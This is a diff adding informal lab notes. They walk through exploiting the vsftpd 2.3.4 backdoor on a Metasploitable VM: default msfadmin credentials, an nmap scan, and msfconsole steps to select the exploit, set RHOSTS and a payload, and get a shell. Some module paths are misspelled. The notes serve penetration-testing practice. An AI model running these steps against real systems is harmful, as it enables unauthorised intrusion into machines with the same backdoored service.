@@ -1,0 +1,49 @@
+========= in VMware open Metasploit file - ==========
+
+msfadmin
+
+pass : msfadmin
+
+ifconfig ===== write ipaddress
+
+cntrl+alt ==== this don't type this is for cursor move
+
+===========
+
+==== open nmap =====
+
+==== in target ==== give ip address
+
+==== click on scan ===
+
+=====================
+
+==== open Linux =======
+
+msfconsole
+
+search vsftpd  === in this it will get (exploit/unix/ftp/vsftp_234_backdoor) copy this
+
+use (paste here)
+
+show payloads
+
+info
+
+set RHOSTS (ip address)
+
+info
+
+show payloads === in this it will get (payloads/lmd/unix/interact) copy this
+
+set (paste)
+
+exploit
+
+ls
+
+
+
+
+
+
